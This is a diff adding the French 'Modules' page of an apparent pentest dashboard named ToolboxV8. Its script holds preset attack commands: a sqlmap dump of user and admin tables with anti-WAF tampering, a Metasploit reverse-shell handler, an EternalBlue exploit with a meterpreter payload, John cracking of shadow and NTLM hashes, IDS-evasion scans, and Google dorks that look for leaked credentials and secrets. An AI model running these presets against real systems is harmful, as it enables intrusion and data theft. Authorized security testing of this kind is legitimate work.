@@ -1,0 +1,1446 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Modules – ToolboxV8</title>
+  <link rel="stylesheet" href="/static/css/app.css" />
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+</head>
+<body>
+
+<aside class="sidebar">
+  <div class="sidebar-brand">
+    <div class="brand-icon"><i data-lucide="shield-check"></i></div>
+    <div><div class="brand-name">ToolboxV8</div><div class="brand-sub">v1.0.0</div></div>
+  </div>
+  <nav class="sidebar-nav">
+    <div class="nav-section-label">Navigation</div>
+    <a href="/dashboard" class="nav-item"><span class="nav-icon"><i data-lucide="layout-dashboard"></i></span> Dashboard</a>
+    <a href="/modules" class="nav-item nav-not-reader active"><span class="nav-icon"><i data-lucide="wrench"></i></span> Modules</a>
+    <a href="/reports" class="nav-item"><span class="nav-icon"><i data-lucide="file-text"></i></span> Rapports</a>
+    <div class="nav-section-label nav-admin-only" style="margin-top:16px;display:none">Défensif</div>
+    <a href="/siem" class="nav-item nav-admin-only" style="display:none">
+      <span class="nav-icon"><i data-lucide="radar"></i></span> SIEM
+    </a>
+
+    <div class="nav-section-label nav-admin-only" style="margin-top:16px;display:none">Administration</div>
+    <a href="/admin/users" class="nav-item nav-admin-only" style="display:none">
+      <span class="nav-icon"><i data-lucide="users"></i></span> Utilisateurs
+    </a>
+  </nav>
+  <div class="sidebar-footer">
+    <div class="user-info">
+      <div class="user-avatar" id="user-avatar">A</div>
+      <div><div class="user-name" id="user-name">–</div><div class="user-role" id="user-role">–</div></div>
+    </div>
+    <button class="btn-logout" onclick="logout()" title="Déconnexion"><i data-lucide="log-out"></i></button>
+  </div>
+</aside>
+
+<main class="main">
+  <header class="topbar">
+    <div class="topbar-left">
+      <h1 class="page-title">Modules Pentest</h1>
+      <span class="breadcrumb">Lancement de scans</span>
+    </div>
+    <div class="topbar-right">
+      <div class="status-dot" id="api-status"></div>
+      <span class="topbar-time" id="clock">–</span>
+    </div>
+  </header>
+
+  <div class="content">
+    <div class="modules-layout">
+
+      <!-- Sélecteur de module -->
+      <div class="module-cards">
+        <div class="module-card active" data-module="passive_recon" onclick="selectModule('passive_recon',this)">
+          <div class="mc-icon" style="background:rgba(20,184,166,.15);color:#2dd4bf"><i data-lucide="search" class="icon-lg"></i></div>
+          <div class="mc-body">
+            <div class="mc-name">Reconnaissance passive</div>
+            <div class="mc-desc">Google Dorks · OSINT</div>
+          </div>
+          <div class="mc-arrow"><i data-lucide="chevron-right"></i></div>
+        </div>
+        <div class="module-card" data-module="recon" onclick="selectModule('recon',this)">
+          <div class="mc-icon" style="background:rgba(59,130,246,.15);color:#60a5fa"><i data-lucide="radar" class="icon-lg"></i></div>
+          <div class="mc-body">
+            <div class="mc-name">Reconnaissance</div>
+            <div class="mc-desc">DNS · Nmap · Whois · WhatWeb</div>
+          </div>
+          <div class="mc-arrow"><i data-lucide="chevron-right"></i></div>
+        </div>
+        <div class="module-card" data-module="scan" onclick="selectModule('scan',this)">
+          <div class="mc-icon" style="background:rgba(245,158,11,.15);color:#fbbf24"><i data-lucide="shield-alert" class="icon-lg"></i></div>
+          <div class="mc-body">
+            <div class="mc-name">Scan Vulnérabilités</div>
+            <div class="mc-desc">Nmap NSE · Nikto · SSLyze</div>
+          </div>
+          <div class="mc-arrow"><i data-lucide="chevron-right"></i></div>
+        </div>
+        <div class="module-card" data-module="exploit" onclick="selectModule('exploit',this)">
+          <div class="mc-icon" style="background:rgba(239,68,68,.15);color:#f87171"><i data-lucide="zap" class="icon-lg"></i></div>
+          <div class="mc-body">
+            <div class="mc-name">Exploitation</div>
+            <div class="mc-desc">SQLmap · Hydra · Metasploit · John</div>
+          </div>
+          <div class="mc-arrow"><i data-lucide="chevron-right"></i></div>
+        </div>
+        <div class="module-card" data-module="web_scan" onclick="selectModule('web_scan',this)">
+          <div class="mc-icon" style="background:rgba(139,92,246,.15);color:#a78bfa"><i data-lucide="globe" class="icon-lg"></i></div>
+          <div class="mc-body">
+            <div class="mc-name">Web / API</div>
+            <div class="mc-desc">ZAP · Gobuster · Dep-Check</div>
+          </div>
+          <div class="mc-arrow"><i data-lucide="chevron-right"></i></div>
+        </div>
+      </div>
+
+      <!-- Formulaire + progression -->
+      <div style="display:flex;flex-direction:column;gap:16px">
+
+        <!-- Formulaire de lancement -->
+        <div class="launch-panel">
+          <div class="panel-header">
+            <h2 class="panel-title" id="form-title">Reconnaissance passive</h2>
+            <span class="module-badge" id="form-badge">passive_recon</span>
+          </div>
+          <form id="launch-form" onsubmit="launchScan(event)">
+            <div class="form-group">
+              <label>Cible</label>
+              <input type="text" id="target" placeholder="ex: 192.168.1.1 ou example.com" required oninput="validateTarget()" />
+              <div id="target-error" class="field-error" style="display:none">
+                <i data-lucide="alert-circle"></i>
+                <span id="target-error-msg">Format invalide</span>
+              </div>
+            </div>
+            <div id="module-options"></div>
+            <button type="submit" class="btn-launch" id="btn-launch">
+              <span id="launch-spinner" class="spinner" style="display:none"></span>
+              <span id="launch-text"><i data-lucide="rocket"></i> Lancer le scan</span>
+            </button>
+          </form>
+        </div>
+
+        <!-- Barre de progression (masquée au départ) -->
+        <div id="progress-panel" style="display:none">
+          <div class="progress-panel">
+            <div class="progress-header">
+              <div class="progress-module-icon" id="prog-icon"><i data-lucide="radar" class="icon-lg"></i></div>
+              <div>
+                <div class="progress-title" id="prog-title">Reconnaissance en cours</div>
+                <div style="font-size:.78rem;color:var(--text-3);margin-top:2px" id="prog-target">–</div>
+              </div>
+              <span class="progress-status progress-status--pending" id="prog-status-badge">pending</span>
+            </div>
+
+            <div class="progress-body">
+              <!-- Barre -->
+              <div class="progress-bar-wrap">
+                <div class="progress-bar-track">
+                  <div class="progress-bar-fill" id="prog-bar" style="width:0%"></div>
+                </div>
+                <div class="progress-pct" id="prog-pct">0%</div>
+              </div>
+
+              <!-- Étape courante -->
+              <div class="progress-step">
+                <div class="step-dot" id="step-dot"></div>
+                <span id="prog-step">En attente de démarrage...</span>
+              </div>
+
+              <!-- Terminal CLI -->
+              <div class="terminal">
+                <div class="terminal-titlebar">
+                  <div class="term-dots">
+                    <span class="tdot tdot--red"></span>
+                    <span class="tdot tdot--yellow"></span>
+                    <span class="tdot tdot--green"></span>
+                  </div>
+                  <span class="terminal-title" id="term-title">bash — toolboxv8@kali</span>
+                </div>
+                <div class="terminal-body" id="term-body">
+                  <div class="term-line">
+                    <span class="term-prompt">toolboxv8@kali:~$</span>
+                    <span class="term-cursor"> █</span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Résultats OSINT / Dorks (reconnaissance passive) -->
+              <div id="dork-results" class="dork-results" style="display:none"></div>
+
+              <!-- Actions quand terminé -->
+              <div id="prog-actions" style="display:none;margin-top:16px;gap:10px">
+                <button class="btn-sm" onclick="genReport(currentJobId)" style="padding:8px 16px">
+                  <i data-lucide="file-text"></i> Générer le rapport
+                </button>
+                <button class="btn-sm" onclick="resetProgress()" style="padding:8px 16px">
+                  <i data-lucide="rotate-ccw"></i> Nouveau scan
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Historique -->
+    <div class="panel" style="margin-top:24px">
+      <div class="panel-header">
+        <h2 class="panel-title">Historique des jobs</h2>
+        <button class="panel-action" onclick="loadJobs()"><i data-lucide="refresh-cw"></i> Actualiser</button>
+      </div>
+      <table class="table">
+        <thead>
+          <tr><th>#</th><th>Module</th><th>Cible</th><th>Statut</th><th>Date</th><th>Actions</th></tr>
+        </thead>
+        <tbody id="jobs-body">
+          <tr><td colspan="6" class="table-empty">Chargement…</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</main>
+
+<!-- ── Modal : saisie manuelle d'une liste (utilisateurs / mots de passe / wordlist) ── -->
+<div id="wl-modal" class="wl-modal" aria-hidden="true">
+  <div class="wl-modal-backdrop" onclick="closeWordlistModal()"></div>
+  <div class="wl-modal-dialog" role="dialog" aria-modal="true" aria-labelledby="wl-modal-title">
+    <div class="wl-modal-head">
+      <h3 id="wl-modal-title">Liste manuelle</h3>
+      <button type="button" class="wl-modal-close" onclick="closeWordlistModal()" title="Fermer">
+        <i data-lucide="x"></i>
+      </button>
+    </div>
+    <div class="wl-modal-body">
+      <p class="wl-modal-hint">Entrez une valeur par ligne (séparées par un retour à la ligne).</p>
+      <textarea id="wl-modal-textarea" rows="14" placeholder="admin&#10;root&#10;user1&#10;user2"></textarea>
+      <div class="wl-modal-count" id="wl-modal-count">0 entrée(s)</div>
+    </div>
+    <div class="wl-modal-foot">
+      <button type="button" class="btn-sm" onclick="closeWordlistModal()">Annuler</button>
+      <button type="button" class="btn-sm btn-primary" onclick="saveWordlistModal()">
+        <i data-lucide="check"></i> Valider
+      </button>
+    </div>
+  </div>
+</div>
+
+<style>
+/* ── Wordlist picker ── */
+.wl-picker { margin-bottom: 14px; }
+.wl-picker-label { display:flex; align-items:center; gap:6px; font-size:.82rem; font-weight:600; color:#cbd5e1; margin-bottom:6px; letter-spacing:.3px; }
+.wl-picker-label svg { width: 14px; height: 14px; }
+.wl-tabs { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:8px; }
+.wl-summary {
+  display:flex; align-items:center; gap:6px;
+  padding: 8px 10px; border-radius: 8px;
+  background: rgba(59,130,246,.08);
+  border: 1px dashed rgba(59,130,246,.25);
+  font-size: .8rem; color: #93c5fd;
+  min-height: 34px;
+}
+.wl-summary.wl-empty { background: rgba(71,85,105,.15); border-color: rgba(71,85,105,.3); color: #94a3b8; }
+.wl-summary svg { width: 14px; height: 14px; }
+
+/* ── Modal ── */
+.wl-modal { position: fixed; inset: 0; display: none; z-index: 9999; align-items: center; justify-content: center; }
+.wl-modal.open { display: flex; }
+.wl-modal-backdrop { position: absolute; inset: 0; background: rgba(3,7,18,.72); backdrop-filter: blur(4px); }
+.wl-modal-dialog {
+  position: relative; z-index: 1;
+  width: min(92vw, 560px);
+  background: #111827;
+  border: 1px solid rgba(239,68,68,.25);
+  border-radius: 14px;
+  box-shadow: 0 25px 60px rgba(0,0,0,.6), 0 0 40px rgba(239,68,68,.08);
+  display: flex; flex-direction: column;
+  max-height: 85vh;
+}
+.wl-modal-head {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 18px 22px; border-bottom: 1px solid rgba(255,255,255,.07);
+}
+.wl-modal-head h3 { font-size: 1.05rem; font-weight: 700; color: #f1f5f9; }
+.wl-modal-close {
+  background: none; border: none; cursor: pointer; padding: 6px;
+  color: #64748b; border-radius: 6px;
+}
+.wl-modal-close:hover { color: #e2e8f0; background: rgba(255,255,255,.05); }
+.wl-modal-close svg { width: 18px; height: 18px; }
+.wl-modal-body { padding: 18px 22px; overflow-y: auto; }
+.wl-modal-hint { font-size: .82rem; color: #94a3b8; margin-bottom: 10px; }
+.wl-modal-body textarea {
+  width: 100%; padding: 12px;
+  background: #0b1220; border: 1px solid rgba(51,65,85,.6);
+  border-radius: 8px; color: #e2e8f0; font-family: monospace; font-size: .88rem;
+  resize: vertical; outline: none;
+}
+.wl-modal-body textarea:focus { border-color: rgba(239,68,68,.5); box-shadow: 0 0 0 3px rgba(239,68,68,.08); }
+.wl-modal-count { margin-top: 8px; font-size: .78rem; color: #64748b; text-align: right; }
+.wl-modal-foot {
+  display: flex; gap: 10px; justify-content: flex-end;
+  padding: 14px 22px; border-top: 1px solid rgba(255,255,255,.07);
+}
+.btn-sm.btn-primary {
+  background: linear-gradient(135deg, #ef4444, #dc2626);
+  border-color: transparent; color: #fff;
+}
+.btn-sm.btn-primary:hover { background: linear-gradient(135deg, #dc2626, #b91c1c); color: #fff; }
+
+/* ── OSINT / Google Dorks ── */
+.dork-results { margin-top: 16px; }
+.dork-results-head {
+  display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px;
+  margin-bottom: 12px;
+}
+.dork-results-head h3 { font-size: .95rem; font-weight: 700; color: #f1f5f9; }
+.dork-results-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+.dork-list { display: flex; flex-direction: column; gap: 8px; max-height: 320px; overflow-y: auto; }
+.dork-item {
+  display: flex; align-items: flex-start; gap: 12px; padding: 10px 12px;
+  background: rgba(15,23,42,.6); border: 1px solid rgba(255,255,255,.06); border-radius: 8px;
+}
+.dork-item:hover { border-color: rgba(45,212,191,.25); background: rgba(20,184,166,.06); }
+.dork-item-body { flex: 1; min-width: 0; }
+.dork-item-name { font-size: .85rem; font-weight: 600; color: #e2e8f0; }
+.dork-item-query {
+  font-family: monospace; font-size: .78rem; color: #94a3b8; margin-top: 4px;
+  word-break: break-all;
+}
+.dork-item-cat { font-size: .7rem; color: #64748b; margin-top: 2px; }
+.dork-open-btn {
+  flex-shrink: 0; padding: 6px 10px; font-size: .75rem;
+  background: rgba(20,184,166,.15); border: 1px solid rgba(45,212,191,.3);
+  color: #2dd4bf; border-radius: 6px; cursor: pointer; text-decoration: none;
+  display: inline-flex; align-items: center; gap: 4px;
+}
+.dork-open-btn:hover { background: rgba(20,184,166,.25); color: #5eead4; }
+.dork-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 8px; }
+.dork-check {
+  display: flex; align-items: flex-start; gap: 8px; padding: 8px 10px;
+  background: rgba(15,23,42,.5); border: 1px solid rgba(255,255,255,.06);
+  border-radius: 8px; cursor: pointer; font-size: .8rem;
+}
+.dork-check:hover { border-color: rgba(45,212,191,.2); }
+.dork-check input { margin-top: 3px; accent-color: #2dd4bf; }
+.dork-check-label { color: #cbd5e1; line-height: 1.35; }
+.dork-check-desc { font-size: .72rem; color: #64748b; margin-top: 2px; }
+.dork-section-label { font-size: .75rem; font-weight: 600; color: #64748b; text-transform: uppercase; letter-spacing: .5px; margin: 12px 0 6px; }
+</style>
+
+<script src="/static/js/app.js"></script>
+<script>
+requireAuth();
+loadUserInfo();
+startClock();
+
+// ── Presets pour chaque outil (icon = lucide icon name) ─────
+const presets = {
+  nmap: {
+    quick:    { name: 'Quick',    icon: 'zap',           desc: 'Top 100 ports TCP, scan rapide SYN',                args: '-sS -Pn --top-ports 100 -T4' },
+    standard: { name: 'Standard', icon: 'shield',        desc: 'Détection services + OS sur top 1000 ports',        args: '-sV -O -Pn --top-ports 1000' },
+    full:     { name: 'Full TCP', icon: 'flame',         desc: 'Tous les ports TCP, scripts NSE par défaut',        args: '-sS -sV -O -Pn -p- -T4 --script=default' },
+    stealth:  { name: 'Stealth',  icon: 'eye-off',       desc: 'SYN scan lent avec fragmentation (évasion IDS)',    args: '-sS -Pn -T2 -f --top-ports 1000' },
+  },
+  nmap_vuln: {
+    quick:    { name: 'Quick',    icon: 'zap',    desc: 'Scripts par défaut (rapide, peu intrusif)',                args: '--script=default -Pn' },
+    standard: { name: 'Standard', icon: 'shield', desc: 'Catégorie vuln — détection CVE et vulnérabilités',         args: '--script=vuln -Pn' },
+    full:     { name: 'Full',     icon: 'flame',  desc: 'vuln + exploit + auth — audit offensif complet',           args: '--script=vuln,exploit,auth -Pn' },
+    safe:     { name: 'Safe',     icon: 'eye-off',desc: 'Scripts non destructifs uniquement',                        args: '--script=safe -Pn' },
+  },
+  nikto: {
+    quick:    { name: 'Quick',    icon: 'zap',           desc: 'Tests de base, fichiers exposés',                   args: '-h {target} -port {port} -Tuning x -nointeractive' },
+    standard: { name: 'Standard', icon: 'shield',        desc: 'Tuning x6 (CGI, fichiers, config, injection)',      args: '-h {target} -port {port} -Tuning x6 -nointeractive' },
+    full:     { name: 'Full',     icon: 'flame',         desc: 'Tous les modules de tests Nikto',                   args: '-h {target} -port {port} -Tuning 0123456789abc -nointeractive' },
+    evasion:  { name: 'Evasion',  icon: 'eye-off',       desc: 'Avec techniques d\'évasion IDS',                    args: '-h {target} -port {port} -evasion 1 -nointeractive' },
+  },
+  sslyze: {
+    cert:     { name: 'Certificat', icon: 'file-badge', desc: 'Infos certificat et chaîne uniquement',              args: '--certinfo {target}' },
+    standard: { name: 'Standard',   icon: 'shield',     desc: 'Audit TLS (Mozilla intermediate + certif + headers)', args: '--mozilla_config intermediate --certinfo --http_headers --elliptic_curves {target}' },
+    full:     { name: 'Full',       icon: 'flame',      desc: 'Audit complet + Heartbleed + ROBOT + legacy TLS',    args: '--certinfo --elliptic_curves --http_headers --tlsv1_2 --tlsv1_3 --sslv2 --sslv3 --reneg --resum --heartbleed --robot --compression --openssl_ccs {target}' },
+  },
+  sqlmap: {
+    quick:      { name: 'Quick',      icon: 'zap',      desc: 'Test rapide niveau 1, risk 1',                       args: '-u {target} --batch --level=1 --risk=1' },
+    standard:   { name: 'Standard',   icon: 'shield',   desc: 'Niveau 3, risk 2, 4 threads, random user-agent',     args: '-u {target} --batch --level=3 --risk=2 --random-agent --threads=4' },
+    aggressive: { name: 'Aggressive', icon: 'flame',    desc: 'Niveau 5 max, 10 threads, tamper anti-WAF',          args: '-u {target} --batch --level=5 --risk=3 --random-agent --threads=10 --tamper=space2comment' },
+    dump:       { name: 'Dump DB',    icon: 'database', desc: 'Énumère DB courante + dump cible (users/admin/accounts) limite 5 lignes', args: '-u {target} --batch --current-db --tables -T users,admin,accounts --columns --dump --first=1 --last=5 --threads=10' },
+  },
+  // Hydra : plus de presets de commande brute. Le choix du service / des
+  // wordlists passe par le formulaire structuré (wl-picker + modal).
+  msf: {
+    handler:  { name: 'Handler',     icon: 'crosshair',     desc: 'Reverse shell handler générique sur 0.0.0.0:4444',  args: 'use exploit/multi/handler\nset PAYLOAD generic/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nrun' },
+    eternal:  { name: 'EternalBlue', icon: 'skull',         desc: 'Exploit MS17-010 (Windows SMBv1, payload meterpreter)', args: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {target}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun' },
+    portscan: { name: 'PortScan',    icon: 'search',        desc: 'Scanner TCP auxiliaire (1-65535)',                    args: 'use auxiliary/scanner/portscan/tcp\nset RHOSTS {target}\nset PORTS 1-65535\nrun' },
+    smb:      { name: 'SMB Vuln',    icon: 'octagon-alert', desc: 'Scanner de vulnérabilités SMB (MS17-010)',            args: 'use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS {target}\nrun' },
+  },
+  john: {
+    auto:   { name: 'Auto',      icon: 'wand',          desc: 'Détection automatique du format + wordlist rockyou',  args: 'john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}' },
+    md5:    { name: 'MD5',       icon: 'hash',          desc: 'Hashes MD5 bruts (raw-md5)',                          args: 'john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}' },
+    sha:    { name: 'SHA-512',   icon: 'fingerprint',   desc: 'Hashes sha512crypt (Linux /etc/shadow moderne)',      args: 'john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}' },
+    nt:     { name: 'NTLM',      icon: 'key-square',    desc: 'Hashes NT/NTLM (Windows)',                            args: 'john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}' },
+    rules:  { name: 'Rules+',    icon: 'flame',         desc: 'Wordlist + règles de mutation (leet, suffixes…)',     args: 'john --wordlist=/usr/share/wordlists/rockyou.txt --rules {hashfile}' },
+  },
+  zap_spider: {
+    quick:    { name: 'Quick',    icon: 'zap',    desc: 'Crawl rapide profondeur 3',                          args: 'spider {target} --max-depth 3 --safe' },
+    standard: { name: 'Standard', icon: 'shield', desc: 'Crawl récursif profondeur 5',                        args: 'spider {target} --max-depth 5 --recursive --safe' },
+    deep:     { name: 'Deep',     icon: 'flame',  desc: 'Crawl profond depth 10 + sous-domaines inclus',      args: 'spider {target} --max-depth 10 --recursive --include-subdomains' },
+  },
+  zap_active: {
+    quick:    { name: 'Quick', icon: 'zap',    desc: 'XSS + SQLi uniquement (rapide)',                        args: 'active-scan {target} --scanners xss,sqli' },
+    owasp:    { name: 'OWASP', icon: 'shield', desc: 'OWASP Top 10 : XSS, SQLi, CSRF, SSRF',                  args: 'active-scan {target} --recursive --scanners xss,sqli,csrf,ssrf' },
+    full:     { name: 'Full',  icon: 'flame',  desc: 'Tous les scanners, intensité haute (long)',             args: 'active-scan {target} --recursive --scanners all --strength high' },
+  },
+  whatweb: {
+    quick:    { name: 'Quick',    icon: 'zap',    desc: 'Passif (-a 1) — rapide, peu intrusif',                    args: '-a 1 --color=never' },
+    standard: { name: 'Standard', icon: 'shield', desc: 'Agressif (-a 3) — CMS, plugins, versions',                args: '-a 3 -v --color=never' },
+    full:     { name: 'Full',     icon: 'flame',  desc: 'Très agressif (-a 4) — fingerprinting complet',           args: '-a 4 -v --color=never' },
+  },
+  gobuster: {
+    quick:    { name: 'Quick',    icon: 'zap',    desc: 'dirb/common.txt — scan rapide des chemins courants',      args: 'quick' },
+    standard: { name: 'Standard', icon: 'shield', desc: 'dirbuster small — bon compromis vitesse / couverture',    args: 'standard' },
+    full:     { name: 'Full',     icon: 'flame',  desc: 'dirbuster medium — énumération plus exhaustive (long)',   args: 'full' },
+  },
+};
+
+// ── Catalogue Google Dorks (reconnaissance passive) ─────────
+const DORK_CATALOG = {
+  // ── Mot-clé général (cible libre : nom, marque, sujet…) ──
+  kw_pdf:           { name: 'PDF mentionnant la cible',  category: 'Mot-clé',    query: '"{target}" filetype:pdf' },
+  kw_office:        { name: 'Documents Office',          category: 'Mot-clé',    query: '"{target}" (filetype:doc | filetype:docx | filetype:xls | filetype:xlsx)' },
+  kw_intitle:       { name: 'Pages avec ce titre',       category: 'Mot-clé',    query: 'intitle:"{target}"' },
+  kw_cv:            { name: 'CV / Curriculum',           category: 'Mot-clé',    query: '"{target}" ("CV" | "curriculum vitae" | "resume") filetype:pdf' },
+  kw_leaks:         { name: 'Fuites / breaches',         category: 'Mot-clé',    query: '"{target}" ("leaked" | "leak" | "breach" | "dump" | "database")' },
+  kw_creds:         { name: 'Mentions de credentials',   category: 'Mot-clé',    query: '"{target}" ("password" | "passwd" | "credentials" | "api_key")' },
+  // ── Réseaux sociaux / plateformes ──
+  social_linkedin:  { name: 'LinkedIn',                  category: 'Réseaux sociaux', query: '"{target}" site:linkedin.com' },
+  social_github:    { name: 'GitHub',                    category: 'Réseaux sociaux', query: '"{target}" site:github.com' },
+  social_twitter:   { name: 'Twitter / X',               category: 'Réseaux sociaux', query: '"{target}" (site:twitter.com | site:x.com)' },
+  social_reddit:    { name: 'Reddit',                    category: 'Réseaux sociaux', query: '"{target}" site:reddit.com' },
+  social_facebook:  { name: 'Facebook',                  category: 'Réseaux sociaux', query: '"{target}" site:facebook.com' },
+  social_pastebin:  { name: 'Pastebin / pastes',         category: 'Réseaux sociaux', query: '"{target}" (site:pastebin.com | site:paste.ee | site:ghostbin.com)' },
+  // ── Dorks domaine (cible = domaine ou IP) ──
+  site:             { name: 'Pages indexées',            category: 'Domaine',    query: 'site:{target}' },
+  subdomains:       { name: 'Sous-domaines',             category: 'Domaine',    query: 'site:*.{target} -www' },
+  pdf:              { name: 'PDF du domaine',            category: 'Domaine',    query: 'site:{target} ext:pdf' },
+  office:           { name: 'Office du domaine',         category: 'Domaine',    query: 'site:{target} (ext:doc | ext:docx | ext:xls | ext:xlsx)' },
+  configs:          { name: 'Fichiers de config',        category: 'Domaine',    query: 'site:{target} (ext:conf | ext:cfg | ext:ini | ext:env)' },
+  sql_logs:         { name: 'SQL / logs / backups',      category: 'Domaine',    query: 'site:{target} (ext:sql | ext:log | ext:bak | ext:backup)' },
+  admin:            { name: "Panneaux d'admin",          category: 'Domaine',    query: 'site:{target} (inurl:admin | inurl:wp-admin)' },
+  login:            { name: 'Pages de connexion',        category: 'Domaine',    query: 'site:{target} (inurl:login | inurl:signin)' },
+  directory_listing:{ name: 'Directory listing',         category: 'Domaine',    query: 'site:{target} intitle:"index of"' },
+  api_keys:         { name: 'Secrets exposés',           category: 'Domaine',    query: 'site:{target} ("api_key" | "password" | "secret")' },
+  emails:           { name: 'Emails du domaine',         category: 'Domaine',    query: 'intext:"@{target}"' },
+  errors:           { name: "Messages d'erreur",         category: 'Domaine',    query: 'site:{target} ("sql syntax" | "fatal error" | "stack trace")' },
+};
+
+const DORK_ENGINES = {
+  google:     { name: 'Google',     url: q => `https://www.google.com/search?q=${encodeURIComponent(q)}` },
+  bing:       { name: 'Bing',       url: q => `https://www.bing.com/search?q=${encodeURIComponent(q)}` },
+  duckduckgo: { name: 'DuckDuckGo', url: q => `https://duckduckgo.com/?q=${encodeURIComponent(q)}` },
+};
+
+function normalizeDorkTarget(target) {
+  let t = target.trim().toLowerCase();
+  t = t.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
+  if (t.startsWith('www.')) t = t.slice(4);
+  return t;
+}
+
+function buildDorkList(target, engineKey, selectedIds) {
+  const domain = normalizeDorkTarget(target);
+  const eng = DORK_ENGINES[engineKey] || DORK_ENGINES.google;
+  const ids = selectedIds && selectedIds.length ? selectedIds : Object.keys(DORK_CATALOG);
+  return ids.filter(id => DORK_CATALOG[id]).map(id => {
+    const d = DORK_CATALOG[id];
+    const query = d.query.replace(/\{target\}/g, domain);
+    return { id, name: d.name, category: d.category, query, url: eng.url(query) };
+  });
+}
+
+function dorkOptionsHtml() {
+  const byCat = {};
+  Object.entries(DORK_CATALOG).forEach(([id, d]) => {
+    if (!byCat[d.category]) byCat[d.category] = [];
+    byCat[d.category].push([id, d]);
+  });
+  let html = `
+    <div class="cmd-block">
+      <div class="cmd-label"><i data-lucide="search"></i> Moteur de recherche</div>
+      <select id="opt-engine">
+        <option value="google">Google</option>
+        <option value="bing">Bing</option>
+        <option value="duckduckgo">DuckDuckGo</option>
+      </select>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label"><i data-lucide="edit-3"></i> Dorks personnalisés</div>
+      <div class="preset-desc" style="margin-bottom:8px">
+        Une requête par ligne. Utilisez <code>{target}</code> pour le domaine (ex: <code>site:{target} ext:pdf</code>).
+      </div>
+      <textarea id="custom-dorks-input" class="cmd-textarea" rows="6" placeholder="site:{target} ext:pdf&#10;site:{target} inurl:admin&#10;intext:&quot;@{target}&quot;&#10;site:{target} filetype:sql"></textarea>
+      <div class="cmd-hint">Saisie libre : une ligne = une recherche.</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label"><i data-lucide="list-checks"></i> Dorks prédéfinis</div>
+      <div class="preset-desc" style="margin-bottom:10px">
+        Cochez les modèles à inclure. Liens ouverts automatiquement si l'option est activée.
+      </div>
+      <div class="preset-chips" style="margin-bottom:12px">
+        <button type="button" class="chip active" id="dork-btn-all"><i data-lucide="check-square"></i> Tout sélectionner</button>
+        <button type="button" class="chip" id="dork-btn-none"><i data-lucide="square"></i> Tout désélectionner</button>
+      </div>
+      <div id="dork-preset-list">`;
+  Object.entries(byCat).forEach(([cat, items]) => {
+    html += `<div class="dork-section-label">${cat}</div><div class="dork-grid">`;
+    items.forEach(([id, d]) => {
+      html += `
+        <label class="dork-check">
+          <input type="checkbox" class="dork-cb" data-dork="${id}" checked />
+          <span>
+            <span class="dork-check-label">${d.name}</span>
+            <div class="dork-check-desc"><code>${d.query.replace('{target}', 'example.com')}</code></div>
+          </span>
+        </label>`;
+    });
+    html += '</div>';
+  });
+  html += `
+      </div>
+    </div>
+    <div class="form-group toggle-row" style="margin-top:14px">
+      <label>Ouvrir les recherches automatiquement à la fin</label>
+      <label class="toggle"><input type="checkbox" id="opt-auto_open" checked><span class="toggle-slider"></span></label>
+    </div>`;
+  return html;
+}
+
+function bindDorkControls() {
+  const allBtn = document.getElementById('dork-btn-all');
+  const noneBtn = document.getElementById('dork-btn-none');
+  if (allBtn) {
+    allBtn.onclick = (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      toggleAllDorks(true);
+    };
+  }
+  if (noneBtn) {
+    noneBtn.onclick = (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      toggleAllDorks(false);
+    };
+  }
+}
+
+function toggleAllDorks(checked) {
+  const root = document.getElementById('dork-preset-list');
+  if (!root) return;
+  root.querySelectorAll('input.dork-cb').forEach(cb => {
+    cb.checked = !!checked;
+  });
+  const allBtn = document.getElementById('dork-btn-all');
+  const noneBtn = document.getElementById('dork-btn-none');
+  if (allBtn) allBtn.classList.toggle('active', !!checked);
+  if (noneBtn) noneBtn.classList.toggle('active', !checked);
+}
+
+function getSelectedDorkIds() {
+  const root = document.getElementById('dork-preset-list');
+  if (!root) return [];
+  return [...root.querySelectorAll('input.dork-cb:checked')].map(cb => cb.dataset.dork);
+}
+
+function getCustomDorkLines() {
+  const ta = document.getElementById('custom-dorks-input');
+  if (!ta) return [];
+  return ta.value.split('\n').map(l => l.trim()).filter(Boolean);
+}
+
+function hasPassiveReconQueries() {
+  return getSelectedDorkIds().length > 0 || getCustomDorkLines().length > 0;
+}
+
+function renderDorkResults(dorks, engineLabel, target) {
+  const panel = document.getElementById('dork-results');
+  if (!panel || !dorks || !dorks.length) {
+    if (panel) panel.style.display = 'none';
+    return;
+  }
+  panel.style.display = 'block';
+  panel.innerHTML = `
+    <div class="dork-results-head">
+      <h3><i data-lucide="search"></i> ${dorks.length} dork(s) — ${esc(engineLabel || 'Google')} · ${esc(target)}</h3>
+      <div class="dork-results-actions">
+        <button type="button" class="btn-sm" onclick="openAllDorkUrls()">
+          <i data-lucide="external-link"></i> Ouvrir toutes les recherches
+        </button>
+      </div>
+    </div>
+    <div class="dork-list" id="dork-list">
+      ${dorks.map(d => `
+        <div class="dork-item">
+          <div class="dork-item-body">
+            <div class="dork-item-name">${esc(d.name)}</div>
+            <div class="dork-item-query">${esc(d.query)}</div>
+            <div class="dork-item-cat">${esc(d.category || '')}</div>
+          </div>
